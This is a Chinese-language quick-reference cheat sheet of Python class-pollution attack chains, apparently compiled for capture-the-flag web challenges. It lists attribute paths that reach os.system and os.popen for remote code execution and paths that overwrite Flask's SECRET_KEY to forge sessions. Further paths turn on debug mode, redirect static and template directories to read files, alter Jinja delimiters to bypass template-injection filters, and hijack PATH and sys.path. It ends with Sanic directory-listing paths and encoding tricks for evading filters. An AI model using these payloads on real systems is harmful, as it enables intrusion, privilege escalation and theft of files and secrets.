# 完整污染链速查清单
```
# === 直接 RCE (invoke) ===
__init__.__globals__.random._os.system
__init__.__globals__.os.system
__init__.__globals__.__builtins__.__import__
__class__.__init__.__globals__.os.popen

# === 属性污染 (set_/merge) ===
__class__.is_admin                                    # 类属性 → 提权
__init__.__globals__.app.config.SECRET_KEY            # Flask session 伪造
__init__.__globals__.app.config.DEBUG                 # 开启调试器
__init__.__globals__.app._got_first_request           # 重触发初始化
__init__.__globals__.app._static_url_path             # 静态目录 → 文件读取
__init__.__globals__.app.jinja_env.variable_start_string  # SSTI 过滤绕过
__init__.__globals__.app.jinja_env.variable_end_string
__init__.__globals__.app.jinja_loader.searchpath       # 模板目录 → 文件读取
__init__.__globals__.os.path.pardir                   # 路径穿越检查绕过
__init__.__globals__.os.environ.PATH                  # 命令劫持
__init__.__globals__.sys.path                         # 模块导入劫持
__init__.__globals__.<func>.__defaults__              # 函数默认参数
__init__.__globals__.<func>.__kwdefaults__            # 关键字默认参数
__init__.__globals__.GLOBAL_VAR                       # 任意全局变量
__init__.__globals__.__file__                          # 劫持文件读取端点

# === Sanic 框架 ===
__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords.directory_handler.directory_view  # 开启目录浏览
__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords.directory_handler.directory._parts  # 修改静态目录

# === Dict obj 前缀 ===
# 所有上述链加 __class__. 前缀:
__class__.__init__.__globals__.app.config.SECRET_KEY

# === 过滤绕过速查 ===
# pydash 路径绕过: __class__\\.__init__\\.__globals__\\.target
# Cookie 八进制:   \137\137class\137\137 → __class__
# URL 编码:        %5F%5Fclass%5F%5F → __class__
```
